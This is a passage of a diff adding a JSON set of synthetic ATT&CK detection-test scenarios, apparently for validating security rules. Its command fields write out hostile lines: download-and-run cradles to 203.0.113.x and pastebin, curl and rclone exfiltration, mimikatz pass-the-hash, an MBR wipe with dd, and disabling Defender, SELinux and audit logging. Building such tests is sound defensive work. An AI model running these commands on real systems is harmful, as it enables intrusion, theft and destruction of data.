+     "executable": "C:\\Users\\Public\\svchost.exe",
+     "command": "svchost.exe -k netsvcs",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1036"
+   ]
+  },
+  {
+   "id": "val2-t1036-007-double-extension-document-ex",
+   "name": "double extension document executed",
+   "description": "Independent validation scenario for T1036.007, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1036.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Users\\ann\\Downloads\\Invoice_2026.pdf.exe",
+     "command": "Invoice_2026.pdf.exe",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1036.007"
+   ]
+  },
+  {
+   "id": "val2-t1070-clear-windows-event-logs-wit",
+   "name": "clear Windows event logs with wevtutil",
+   "description": "Independent validation scenario for T1070, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wevtutil.exe",
+     "command": "wevtutil cl Security",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1070"
+   ]
+  },
+  {
+   "id": "val2-t1070-004-secure-delete-of-the-dropped",
+   "name": "secure-delete of the dropped binary",
+   "description": "Independent validation scenario for T1070.004, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1070.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/shred",
+     "command": "shred -u -z /tmp/.implant",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1070.004"
+   ]
+  },
+  {
+   "id": "val2-t1112-reg-add-disabling-a-security",
+   "name": "reg add disabling a security setting",
+   "description": "Independent validation scenario for T1112, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1112"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\reg.exe",
+     "command": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1112"
+   ]
+  },
+  {
+   "id": "val2-t1202-pcalua-launches-a-payload-as",
+   "name": "pcalua launches a payload as an indirect executor",
+   "description": "Independent validation scenario for T1202, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1202"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\pcalua.exe",
+     "command": "pcalua.exe -a C:\\Users\\Public\\p.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1202"
+   ]
+  },
+  {
+   "id": "val2-t1218-rundll32-executes-script-thr",
+   "name": "rundll32 executes script through mshtml",
+   "description": "Independent validation scenario for T1218, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\rundll32.exe",
+     "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://203.0.113.5/a.sct\")",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218"
+   ]
+  },
+  {
+   "id": "val2-t1218-001-chm-opened-from-a-download",
+   "name": "CHM opened from a download",
+   "description": "Independent validation scenario for T1218.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\hh.exe",
+     "command": "hh.exe C:\\Users\\ann\\Downloads\\readme.chm",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1218.001"
+   ]
+  },
+  {
+   "id": "val2-t1218-003-cmstp-installs-an-inf-silent",
+   "name": "cmstp installs an INF silently",
+   "description": "Independent validation scenario for T1218.003, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmstp.exe",
+     "command": "cmstp.exe /au C:\\Users\\Public\\x.inf",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.003"
+   ]
+  },
+  {
+   "id": "val2-t1218-008-odbcconf-loads-a-response-fi",
+   "name": "odbcconf loads a response-file DLL",
+   "description": "Independent validation scenario for T1218.008, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1218.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\odbcconf.exe",
+     "command": "odbcconf.exe -f C:\\Users\\Public\\r.rsp",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.008"
+   ]
+  },
+  {
+   "id": "val2-t1220-wmic-processes-a-remote-xsl",
+   "name": "wmic processes a remote XSL stylesheet",
+   "description": "Independent validation scenario for T1220, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1220"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+     "command": "wmic os get /format:\"https://203.0.113.5/p.xsl\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1220"
+   ]
+  },
+  {
+   "id": "val2-t1548-setuid-bit-added-to-a-shell",
+   "name": "setuid bit added to a shell copy",
+   "description": "Independent validation scenario for T1548, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation"
+   ],
+   "techniques": [
+    "T1548"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/chmod",
+     "command": "chmod u+s /tmp/.sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1548"
+   ]
+  },
+  {
+   "id": "val2-t1550-pass-the-hash-with-mimikatz",
+   "name": "pass-the-hash with mimikatz",
+   "description": "Independent validation scenario for T1550, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1550"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Users\\Public\\m.exe",
+     "command": "m.exe \"sekurlsa::pth /user:Administrator /domain:corp /ntlm:32ed87bdb5fdc5e9cba88547376818d4\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1550"
+   ]
+  },
+  {
+   "id": "val2-t1553-rogue-root-certificate-added",
+   "name": "rogue root certificate added to the machine store",
+   "description": "Independent validation scenario for T1553, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\certutil.exe",
+     "command": "certutil.exe -addstore -f Root C:\\Users\\Public\\ca.crt",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1553"
+   ]
+  },
+  {
+   "id": "val2-t1553-002-module-with-a-revoked-style",
+   "name": "module with a revoked-style signer is loaded",
+   "description": "Independent validation scenario for T1553.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "module",
+     "module_path": "C:\\Users\\Public\\drv.dll",
+     "signed": true,
+     "module_kind": "dll",
+     "signer": "Realtek Semiconductor Corp (REVOKED)"
+    }
+   ],
+   "expect": [
+    "T1553.002"
+   ]
+  },
+  {
+   "id": "val2-t1553-005-zone-identifier-removed-from",
+   "name": "Zone.Identifier removed from a download",
+   "description": "Independent validation scenario for T1553.005, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell.exe -c Unblock-File -Path C:\\Users\\ann\\Downloads\\tool.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1553.005"
+   ]
+  },
+  {
+   "id": "val2-t1553-006-test-signing-enabled-via-bcd",
+   "name": "test signing enabled via bcdedit",
+   "description": "Independent validation scenario for T1553.006, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1553.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\bcdedit.exe",
+     "command": "bcdedit /set testsigning on",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1553.006"
+   ]
+  },
+  {
+   "id": "val2-t1561-002-overwrite-the-mbr-with-dd",
+   "name": "overwrite the MBR with dd",
+   "description": "Independent validation scenario for T1561.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1561.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/dd",
+     "command": "dd if=/dev/zero of=/dev/sda bs=512 count=1",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1561.002"
+   ]
+  },
+  {
+   "id": "val2-t1562-disable-selinux-enforcement",
+   "name": "disable SELinux enforcement",
+   "description": "Independent validation scenario for T1562, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/setenforce",
+     "command": "setenforce 0",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562"
+   ]
+  },
+  {
+   "id": "val2-t1562-002-clear-audit-policy-via-audit",
+   "name": "clear audit policy via auditpol",
+   "description": "Independent validation scenario for T1562.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\auditpol.exe",
+     "command": "auditpol /clear /y",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1562.002"
+   ]
+  },
+  {
+   "id": "val2-t1562-006-stop-the-audit-daemon",
+   "name": "stop the audit daemon",
+   "description": "Independent validation scenario for T1562.006, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl stop auditd",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.006"
+   ]
+  },
+  {
+   "id": "val2-t1562-007-open-a-cloud-security-group",
+   "name": "open a cloud security group to the internet",
+   "description": "Independent validation scenario for T1562.007, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1562.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws ec2 authorize-security-group-ingress --group-id sg-0abc --protocol tcp --port 22 --cidr 0.0.0.0/0",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1562.007"
+   ]
+  },
+  {
+   "id": "val2-t1564-hide-a-staging-folder-with-a",
+   "name": "hide a staging folder with attributes",
+   "description": "Independent validation scenario for T1564, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\attrib.exe",
+     "command": "attrib +h +s C:\\ProgramData\\Intel",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1564"
+   ]
+  },
+  {
+   "id": "val2-t1564-002-hidden-account-via-the-speci",
+   "name": "hidden account via the SpecialAccounts registry list",
+   "description": "Independent validation scenario for T1564.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
+     "operation": "set",
+     "value_name": "svc_hidden",
+     "value_data": "0"
+    }
+   ],
+   "expect": [
+    "T1564.002"
+   ]
+  },
+  {
+   "id": "val2-t1564-006-headless-vm-started-to-run-t",
+   "name": "headless VM started to run tooling out of sight",
+   "description": "Independent validation scenario for T1564.006, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1564.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/VBoxHeadless",
+     "command": "VBoxHeadless --startvm attackbox",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1564.006"
+   ]
+  },
+  {
+   "id": "val2-t1021-psexec-remote-service-execut",
+   "name": "psexec remote service execution",
+   "description": "Independent validation scenario for T1021, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1021"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\PsExec.exe",
+     "command": "PsExec.exe \\\\10.0.4.12 -s -accepteula cmd.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1021"
+   ]
+  },
+  {
+   "id": "val2-t1563-001-hijack-an-existing-ssh-sessi",
+   "name": "hijack an existing ssh session through its control socket",
+   "description": "Independent validation scenario for T1563.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1563.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -S /tmp/ssh-mux-admin@10.0.0.8:22 -O forward admin@10.0.0.8",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1563.001"
+   ]
+  },
+  {
+   "id": "val2-t1563-002-tscon-takes-over-another-rdp",
+   "name": "tscon takes over another RDP session",
+   "description": "Independent validation scenario for T1563.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1563.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\tscon.exe",
+     "command": "tscon 3 /dest:rdp-tcp#12",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1563.002"
+   ]
+  },
+  {
+   "id": "val2-t1203-office-spawning-a-command-sh",
+   "name": "Office spawning a command shell",
+   "description": "Independent validation scenario for T1203, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1203"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.5/s')",
+     "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+    }
+   ],
+   "expect": [
+    "T1203"
+   ]
+  },
+  {
+   "id": "val2-t1204-user-opened-lure-launches-a",
+   "name": "user-opened lure launches a script host",
+   "description": "Independent validation scenario for T1204, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1204"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wscript.exe",
+     "command": "wscript.exe C:\\Users\\ann\\Downloads\\invoice.js",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1204"
+   ]
+  },
+  {
+   "id": "val2-t1005-bulk-read-of-user-documents",
+   "name": "bulk read of user documents",
+   "description": "Independent validation scenario for T1005, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/find",
+     "command": "find /home -type f ( -name \"*.docx\" -o -name \"*.xlsx\" -o -name \"*.kdbx\" ) -exec cat {} +",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1005"
+   ]
+  },
+  {
+   "id": "val2-t1213-export-of-wiki-pages-with-an",
+   "name": "export of wiki pages with an API token",
+   "description": "Independent validation scenario for T1213, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1213"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -s -u svc:apitoken https://wiki.corp.example/rest/api/content?limit=500&expand=body.storage",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1213"
+   ]
+  },
+  {
+   "id": "val2-t1560-password-protected-archive-o",
+   "name": "password-protected archive of a documents folder",
+   "description": "Independent validation scenario for T1560, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Collection"
+   ],
+   "techniques": [
+    "T1560"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/7z",
+     "command": "7z a -pS3cret -mhe=on /tmp/d.7z /home/ann/Documents",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1560"
+   ]
+  },
+  {
+   "id": "val2-t1071-beacon-over-http-with-a-spoo",
+   "name": "beacon over HTTP with a spoofed UA",
+   "description": "Independent validation scenario for T1071, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1071"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -s -A \"Mozilla/4.0 (compatible; MSIE 6.0)\" http://203.0.113.50/gate.php?id=42",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1071"
+   ]
+  },
+  {
+   "id": "val2-t1071-001-powershell-web-beacon-with-a",
+   "name": "PowerShell web beacon with a fixed cookie header",
+   "description": "Independent validation scenario for T1071.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1071.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell.exe -nop -c \"$w=New-Object Net.WebClient;$w.Headers.Add('Cookie','session=aGVsbG8=');$w.DownloadString('http://203.0.113.50/beacon')\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1071.001"
+   ]
+  },
+  {
+   "id": "val2-t1090-001-internal-host-exposed-as-a-r",
+   "name": "internal host exposed as a relay with an ssh remote forward",
+   "description": "Independent validation scenario for T1090.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1090.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -N -R 0.0.0.0:8080:10.0.0.5:3128 relay@203.0.113.60",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1090.001"
+   ]
+  },
+  {
+   "id": "val2-t1090-003-proxychains-over-a-tor-chain",
+   "name": "proxychains over a tor chain",
+   "description": "Independent validation scenario for T1090.003, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1090.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/proxychains4",
+     "command": "proxychains4 -q curl http://hidden.onion.example/cmd",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1090.003"
+   ]
+  },
+  {
+   "id": "val2-t1102-command-fetched-from-a-code",
+   "name": "command fetched from a code-sharing site",
+   "description": "Independent validation scenario for T1102, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1102"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -s https://pastebin.com/raw/Ab12Cd34 | sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1102"
+   ]
+  },
+  {
+   "id": "val2-t1102-002-results-posted-back-to-a-cha",
+   "name": "results posted back to a chat webhook",
+   "description": "Independent validation scenario for T1102.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1102.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell.exe -c Invoke-RestMethod -Uri https://discord.com/api/webhooks/123456/abcdef -Method Post -Body $env:COMPUTERNAME",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1102.002"
+   ]
+  },
+  {
+   "id": "val2-t1041-stage-archive-posted-to-the",
+   "name": "stage archive POSTed to the beacon host",
+   "description": "Independent validation scenario for T1041, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1041"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -s -X POST --data-binary @/tmp/d.7z http://203.0.113.50/up",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1041"
+   ]
+  },
+  {
+   "id": "val2-t1567-rclone-sync-to-a-consumer-cl",
+   "name": "rclone sync to a consumer cloud",
+   "description": "Independent validation scenario for T1567, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1567"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/rclone",
+     "command": "rclone copy /home/ann/Documents mega:loot --transfers 8",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1567"
+   ]
+  },
+  {
+   "id": "val2-t1568-fast-flux-style-lookups-of-r",
+   "name": "fast-flux style lookups of rotating hostnames",
+   "description": "Independent validation scenario for T1568, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1568"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "dns",
+     "query": "x7k2q9vz1m4p.dyn-update.example",
+     "qtype": "A"
+    },
+    {
+     "type": "dns",
+     "query": "p3w8r5tj2n6b.dyn-update.example",
+     "qtype": "A"
+    },
+    {
+     "type": "dns",
+     "query": "h9d4f1c7y0sa.dyn-update.example",
+     "qtype": "A"
+    }
+   ],
+   "expect": [
+    "T1568"
+   ]
+  },
+  {
+   "id": "val2-t1648-function-code-replaced-throu",
+   "name": "function code replaced through the CLI",
+   "description": "Independent validation scenario for T1648, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Execution"
+   ],
+   "techniques": [
+    "T1648"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws lambda update-function-code --function-name nightly-report --zip-file fileb://p.zip",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1648"
+   ]
+  },
+  {
+   "id": "val2-t1550-001-api-call-replaying-a-stolen",
+   "name": "API call replaying a stolen bearer token from the CLI",
+   "description": "Independent validation scenario for T1550.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Lateral Movement"
+   ],
+   "techniques": [
+    "T1550.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/kubectl",
+     "command": "kubectl --token=eyJhbGciOiJSUzI1NiJ9.e30.x --server=https://10.0.0.1:6443 get secrets -A",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1550.001"
+   ]
+  }
+ ]
+}
